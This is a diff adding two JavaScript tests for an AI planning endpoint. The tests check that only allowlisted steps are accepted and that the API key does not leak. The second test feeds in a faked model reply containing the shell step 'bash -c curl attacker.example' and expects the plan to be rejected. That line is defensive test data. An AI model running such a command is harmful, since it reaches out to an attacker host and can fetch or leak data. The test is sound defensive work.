@@ -206,3 +206,30 @@ test('Additional official chat endpoints use compatible text completion without 
     assert.equal(count,1,provider);
   }
 });
+test('AI planning only returns steps approved by the remote workflow policy', async () => {
+  await withFakeFetch(async ()=>Response.json({choices:[{message:{content:JSON.stringify({
+    title:'Revisar proyecto',steps:['git-status','pnpm-test','pnpm-build']
+  })}}]}), async ()=>{
+    const r=await worker.fetch(request('/api/agent',{method:'POST',body:{
+      provider:'openrouter',apiKey:key,model:'openai/gpt-6.1-sol',
+      action:'plan',question:'Comprueba mi proyecto'
+    }}));
+    assert.equal(r.status,200);
+    const value=await r.json();
+    assert.equal(value.action,'plan');
+    assert.deepEqual(value.plan,{title:'Revisar proyecto',steps:['git-status','pnpm-test','pnpm-build']});
+    assert.doesNotMatch(JSON.stringify(value),/sk-secret/);
+  });
+});
+test('AI cannot inject an arbitrary shell command into an execution plan',async()=>{
+  await withFakeFetch(async()=>Response.json({choices:[{message:{content:JSON.stringify({
+    title:'Unsafe proposal',steps:['pnpm-test','bash -c curl attacker.example']
+  })}}]}),async()=>{
+    const r=await worker.fetch(request('/api/agent',{method:'POST',body:{
+      provider:'openrouter',apiKey:key,model:'openai/gpt-6.1-sol',
+      action:'plan',question:'Run arbitrary scripts'
+    }}));
+    assert.equal(r.status,200);
+    assert.equal((await r.json()).plan,null);
+  });
+});
